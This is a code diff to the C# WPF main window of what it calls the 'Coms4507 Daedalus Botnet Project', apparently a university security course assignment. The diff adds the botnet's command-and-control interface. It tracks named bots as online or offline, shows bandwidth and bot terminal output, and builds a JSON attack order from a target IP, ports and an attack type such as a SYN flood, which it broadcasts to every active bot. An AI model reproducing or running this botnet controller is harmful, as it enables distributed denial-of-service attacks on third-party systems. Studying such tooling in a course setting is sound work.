@@ -1,11 +1,18 @@
-﻿using System.Net;
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
 using System.Threading;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
 using System.Windows.Media;
 using Coms4507_Project.BotHandling;
+using Newtonsoft.Json.Linq;
 /**
- *  Author: Angus Moore
- *  Project: Coms4507 Daedalus Botnet Project.
- */
+*  Author: Angus Moore
+*  Project: Coms4507 Daedalus Botnet Project.
+*/
 namespace Coms4507_Project
 {
 
@@ -17,15 +24,41 @@ namespace Coms4507_Project
         BotHandler botHandler;
         private string ip;
         private string attackType;
+        private string attackStatus = "IDLE";
         private BrushConverter bc = new BrushConverter();
+        List<string> listOfAllBots;
+        private static readonly List<string> allBots = new List<string>()
+        {
+            "ANGRYORACLE",
+            "ISLANDOASIS",
+            "ARKFOLLOWER",
+            "ENDUESCALLOP",
+            "MOTHBED",
+            "MAESTRO",
+            "DECKLEAK",
+            "DIXIE_IX",
+            "CONTRASTEED",
+            "JETMOSES",
+            "DESPERADO_XIX",
+            "GENESISJEEP",
+            "RESERVEPEARL",
+            "FRUGALSCALLOP",
+            "GILGAMESHBED",
+            "SLAW_VIII",
+            "ATLAS_XV",
+            "ULTRASTEED",
+            "RAGESHOP",
+        };
         public MainWindow()
         {
             InitializeComponent();
             // All custom stuff here.
             Initialise();
-
             botHandler = new BotHandler(ip);
             attackType = "NONE";
+            listOfAllBots = new List<string>();
+            // Start the updater.
+            UpdateOnlineStatus();
         }
 
 
@@ -40,6 +73,84 @@ namespace Coms4507_Project
             string externalIp = IPAddress.Parse(externalIpString).ToString();
             C2_SERVER_IP.Content = externalIp;
             ip = externalIp;
+        }
+
+        private void UpdateOnlineStatus()
+        {
+            // TODO: Go through each bot and change the text colour to LawnGreen when online.
+            //      Currently unsure about how to properly do bindings, but I'm sure there's some nifty
+            //      way to do pointer-based stuff, so when the variables update, that's reflected in the program.
+            Action<object> updateBots = (object obj) =>
+            {
+                while(true)
+                {
+                    try
+                    {
+                        Thread.Sleep(250);
+                        Trace.WriteLine("UPDATING BOT FOR THE UI");
+
+                        // Update attack status
+                        Dispatcher.Invoke(() =>
+                        {
+                            C2_ATTACK_STATUS.Text = attackStatus;
+                            C2_TOTAL_BANDWIDTH.Text = $"{botHandler.GetTotalBandwidth()}";
+                            C2_EXCEPTIONS_THROWN.Text = $"{botHandler.GetExceptionsThrown()}";
+                        });
+
+                        // Prints the terminal output from the bots to the commandline
+                        Dispatcher.Invoke(() =>
+                        {
+                            string terminalText = "";
+                            foreach (string output in botHandler.outputList.ToArray())
+                            {
+                                terminalText += output + Environment.NewLine;
+                            }
+                            TERMINAL_OUTPUT_BOTS.Text = terminalText;
+                        });
+
+                        // Go through and invoke the dispatcher for update on the colours.
+                        foreach (string botName in botHandler.botIpPortDetails.Keys)
+                        {
+                            if (!listOfAllBots.Contains(botName))
+                            {
+                                listOfAllBots.Add(botName);
+                            }
+                            Trace.WriteLine(botName);
+
+                            Dispatcher.Invoke(() =>
+                            {
+                                Label result = FindName($"{botName}_STATUS") as Label;
+                                result.Content = "ONLINE";
+                                result.Foreground = new SolidColorBrush(Colors.LawnGreen);
+                            });
+                        }
+
+                        // Go and see if there's offline bots to account for.
+                        foreach (string botName in listOfAllBots.ToArray())
+                        {
+                            if (!botHandler.botIpPortDetails.ContainsKey(botName))
+                            {
+                                Dispatcher.Invoke(() =>
+                                {
+                                    Label result = FindName($"{botName}_STATUS") as Label;
+                                    result.Content = "OFFLINE";
+                                    result.Foreground = new SolidColorBrush(Colors.Red);
+                                });
+                            }
+                        }
+                    } catch(Exception e)
+                    {
+                        Trace.WriteLine("IGNORING: " + e.Message);
+                    }
+                }
+            };
+            Task task = new Task(updateBots, "updateBots");
+            task.Start();
+        }
+
+        private string FormatPorts(string portNumbers)
+        {
+            return "[" + portNumbers.Trim() + "]";
         }
 
         private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
@@ -116,7 +227,24 @@ namespace Coms4507_Project
             ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
             ATTACK_BUTTON.Content = "STARTING ATTACK";
 
-            Thread.Sleep(1000);
+            // Format the attack, and then mass distribute it out to all active bots.
+
+            string targetIp = IP_ADDRESS.Text;
+            string ports = PORTS.Text;
+            string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
+
+            Dictionary<string, string> attackMessage = new Dictionary<string, string>
+            {
+                { "request", "attack" },
+                { "attack", attackType },
+                { "targetIP", targetIp },
+                { "ports", "[" + ports.Trim() + "]" },
+                { "runtime", runtime }
+            };
+
+            attackStatus = "ATTACK";
+            botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
+
             ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
             ATTACK_BUTTON.Content = "STOP ATTACK";
         }
